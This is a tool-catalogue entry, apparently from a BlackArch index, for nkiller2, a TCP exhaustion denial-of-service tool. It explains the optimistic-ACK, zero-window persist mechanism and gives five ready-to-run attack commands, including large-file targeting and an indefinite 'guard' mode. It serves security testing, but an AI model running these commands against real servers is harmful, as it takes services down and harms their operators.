---
name: "nkiller2"
categories:
  - blackarch-dos
version: "2.0"
homepage: "http://sock-raw.org/projects.html"
packaged-by: [blackarch, aur]
blackarch-builddate: "2025-11-30"
build-system: other
license: GPL3
meta-checked: "2026-11-09"
github-repo: "Seabreg/nkiller2"
github-stars: 1
github-pushed: "2019-04-12"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 1.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# nkiller2

> TCP exhaustion tool that parks servers in zero-window persist states using optimistic ACKs.

## What it's for

nkiller2 is a single-file C tool by ithilgore (sock-raw.org) for TCP-layer resource-exhaustion testing. It sends probes to a target's open TCP ports, then — instead of completing transfers — replies to the server's TCP persist/window probes with optimistic ACKs, keeping each half-open connection consuming server memory and timers while spending almost nothing on the attacker side. A libpcap sniffer tracks replies to keep state consistent, and a per-stack template adapts behavior for Linux vs. *BSD/Windows targets. It requires root (raw sockets + sniffing) and is meaningful only in an authorized lab. It is not a bandwidth flooder: the point is to hold server-side resources with minimal traffic.

## Typical use cases

### Exhaust open ports on a host

Run the basic attack against ports known to be open.

```
nkiller2 -t 198.51.100.10 -p 80,443
```

Outcome: probes are sent to both ports and answering machinery begins; on the target, per-connection memory and persist timers are held. Both flags are mandatory — `-t` is the target IP and `-p` a comma-separated port list of known-open ports.

### Target a web server's big file and virtual host

Point the attack at a URL that forces the server to buffer data, on a name-based vhost.

```
nkiller2 -t 198.51.100.10 -p 80 -w /largefile.bin -r example.com
```

Outcome: the server starts sending a large file (`-w`, ideally >4 KB) for virtual host example.com (`-r`) and then stalls in zero-window persist while nkiller2 keeps it alive with optimistic ACKs.

### Auto-drop closed ports when unsure

Let the tool discover which of your candidate ports are actually open.

```
nkiller2 -t 198.51.100.10 -p 21,22,25,80,443,8080 -y
```

Outcome: `-y` enables dynamic port handling — any port that answers with an RST is removed from the list automatically, so the attack continues only against live listeners.

### Keep answering after the probes stop

Hold the exhausted state indefinitely.

```
nkiller2 -t 198.51.100.10 -p 80 -w /largefile.bin -g
```

Outcome: guard mode (`-g`) continues replying to zero-window probes "until the end of times", pinning the server's resources until you interrupt the tool.

### Watch it work in detail

Get per-packet visibility while testing.

```
nkiller2 -t 198.51.100.10 -p 80 -v -d 1
```

Outcome: verbose mode prints ongoing activity and `-d 1` enables debug output (use `-d 2` for everything); useful to confirm probe/ACK exchanges before running longer tests.

*No corpus evidence — derived from upstream documentation.*
